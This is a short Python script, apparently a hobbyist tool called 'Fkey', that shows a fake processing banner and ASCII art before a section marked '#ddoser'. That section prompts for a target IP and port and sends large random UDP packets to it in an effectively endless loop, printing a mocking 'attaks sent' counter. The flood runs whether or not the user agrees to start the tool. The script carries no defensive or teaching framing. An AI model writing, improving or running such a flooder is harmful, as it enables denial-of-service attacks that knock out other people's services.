from os import system as console
from turtle import end_fill
console("@echo off&cls")
import subprocess
import time
import socket
import random

print("\033[0;32m ")

name = input("USR: ")
print("processing...")
time.sleep(1)
print("processing...")
time.sleep(1)
print("processing...")
time.sleep(1)
print("DONE!")
print(" ")

print("Welcome",name,)

answer = "okay" 
while answer not in ["Yes", "yes", "Y", "y", "No", "no", "N", "n"]: 
    answer = input("Would you like to start Fkey? Yes/y or No/n \n") 
    if answer=="Yes" or answer=="yes" or answer=="Y" or answer=="y":
        print(" ")
        print(" ")
        print(" ")
        print(" ")
        print(" ")
        print("Thank you for using Fkey!\n") 

print("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣠⣤⣤⣶⣶⣿⣷⣆")
print("⠀⠀⠀⢀⣤⣤⣶⣶⣾⣿⣿⣿⣿⣿⡿⣿⣿⣿⣿⣿⡆")
print("⠀⢀⣴⣿⣿⣿⣿⣿⣿⡿⠛⠉⠉⠀⠀⠀⣿⣿⣿⣿⣷ ")
print("⣠⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⢤⣶⣾⠿⢿⣿⣿⣿⣿⣇ ")  
print("⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠈⠉⠀⠀⠀⣿⣿⣿⣿⣿⡆ ")
print("⢸⣿⣿⣿⣏⣿⣿⣿⣿⣿⣷⠀⠀⢠⣤⣶⣿⣿⣿⣿⣿⣿⣿⡀ ")
print("⠀⢿⣿⣿⣿⡸⣿⣿⣿⣿⣿⣇⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣧ ")
print("⠀⠸⣿⣿⣿⣷⢹⣿⣿⣿⣿⣿⣄⣀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿ ")
print("⠀⠀⢻⣿⣿⣿⡇⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ")
print("   ⢻⣿⣿⣿⡇⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ")
print("   ⠘⣿⣿⣿⣿⠘⠻⠿⢛⣛⣭⣽⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿ ")
print("   ⠀⢹⣿⣿⠏⠀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠋ ")
print("    ⠈⣿⠏⠀⣰⣿⣿⣿⣿⣿⣿⠿⠟⠛⠋⠉⠀")
print("    ⠀⠀⠀⢠⡿⠿⠛⠋⠉⠀")


 #ddoser

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

ip = input("Enter Target IP: ")
port = int(input("Enter Target Port: "))
sleep = float(input("Sleep: "))

s.connect((ip, port))

for i in range(1, 100**1000):
    s.send(random._urandom(10)*1000)
    print(f"{i} attaks sent >:)", end='\r')
    time.sleep(sleep)
    





if answer=="No" or answer=="no" or answer=="N" or answer=="n":


    subprocess.call("taskkill /f /im Fkey.exe", shell=True)

